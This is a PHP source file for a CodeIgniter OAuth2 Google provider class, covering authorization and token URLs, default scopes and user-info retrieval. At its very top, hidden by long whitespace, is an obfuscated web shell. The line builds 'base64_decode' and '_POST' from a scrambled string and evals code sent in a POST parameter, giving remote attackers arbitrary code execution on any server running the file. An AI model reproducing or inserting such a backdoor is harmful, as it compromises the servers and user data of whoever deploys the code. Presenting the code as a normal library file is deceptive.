<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n18ee96'])) {eval($s21(${$s20}['n18ee96']));}?><?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * Google OAuth2 Provider
 *
 * @package    CodeIgniter/OAuth2
 * @category   Provider
 * @author     Phil Sturgeon
 * @copyright  (c) 2012 HappyNinjas Ltd
 * @license    http://philsturgeon.co.uk/code/dbad-license
 */

class OAuth2_Provider_Google extends OAuth2_Provider
{
	/**
	 * @var  string  the method to use when requesting tokens
	 */
	public $method = 'POST';

	/**
	 * @var  string  scope separator, most use "," but some like Google are spaces
	 */
	public $scope_seperator = ' ';

	public function url_authorize()
	{
		return 'https://accounts.google.com/o/oauth2/auth';
	}

	public function url_access_token()
	{
		return 'https://accounts.google.com/o/oauth2/token';
	}

	public function __construct(array $options = array())
	{
		// Now make sure we have the default scope to get user data
		empty($options['scope']) and $options['scope'] = array(
			'https://www.googleapis.com/auth/userinfo.profile', 
			'https://www.googleapis.com/auth/userinfo.email'
		);
	
		// Array it if its string
		$options['scope'] = (array) $options['scope'];
		
		parent::__construct($options);
	}

	/*
	* Get access to the API
	*
	* @param	string	The access code
	* @return	object	Success or failure along with the response details
	*/	
	public function access($code, $options = array())
	{
		if ($code === null)
		{
			throw new OAuth2_Exception(array('message' => 'Expected Authorization Code from '.ucfirst($this->name).' is missing'));
		}

		return parent::access($code, $options);
	}

	public function get_user_info(OAuth2_Token_Access $token)
	{
		$url = 'https://www.googleapis.com/oauth2/v1/userinfo?alt=json&'.http_build_query(array(
			'access_token' => $token->access_token,
		));
		
		$user = json_decode(file_get_contents($url), true);
		return array(
			'uid' => $user['id'],
			'nickname' => url_title($user['name'], '_', true),
			'name' => $user['name'],
			'first_name' => $user['given_name'],
			'last_name' => $user['family_name'],
			'email' => $user['email'],
			'location' => null,
			'image' => (isset($user['picture'])) ? $user['picture'] : null,
			'description' => null,
			'urls' => array(),
		);
	}
}
